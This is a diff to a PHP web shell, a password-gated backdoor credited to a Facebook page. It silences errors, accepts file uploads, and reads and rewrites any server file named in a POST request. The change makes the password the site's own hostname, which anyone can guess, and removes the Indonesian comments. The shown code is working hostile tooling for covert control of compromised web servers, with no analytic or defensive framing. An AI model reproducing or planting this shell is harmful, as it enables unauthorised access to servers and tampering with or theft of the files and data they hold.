@@ -1,5 +1,5 @@
 <?php
-$password = "michat123!@#"; // hadeh 
+$password = $_SERVER['HTTP_HOST']; 
 
 session_start();
 error_reporting(0);
@@ -13,7 +13,6 @@ $leaf['website']="https://www.facebook.com/cocoseakanakan/";
 
 $sessioncode = md5(__FILE__);
 if(!empty($password) and $_SESSION[$sessioncode] != $password){
-    # _REQUEST mean _POST or _GET 
     if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
         $_SESSION[$sessioncode] = $password;
     }
@@ -46,9 +45,9 @@ if (isset($_FILES['file_upload'])) {
 
 if (isset($_POST['edit_file'])) {
     $file = $_POST['edit_file'];
-    $content = file_get_contents($file); // membaca isi file yang ingin diedit
+    $content = file_get_contents($file);
     if ($content !== false) {
-        echo '<hr><form method="post" action="">'; // buat form baru untuk menampilkan textarea dan tombol Submit
+        echo '<hr><form method="post" action="">';
         echo '<textarea id="CopyFromTextArea" name="file_content" rows="10" class="form-control">' . htmlspecialchars($content) . '</textarea>';
         echo '<input type="hidden" name="edited_file" value="' . htmlspecialchars($file) . '"><br>';
         echo '<button type="submit" name="submit_edit" class="btn btn-outline-light">Submit</button><hr>';
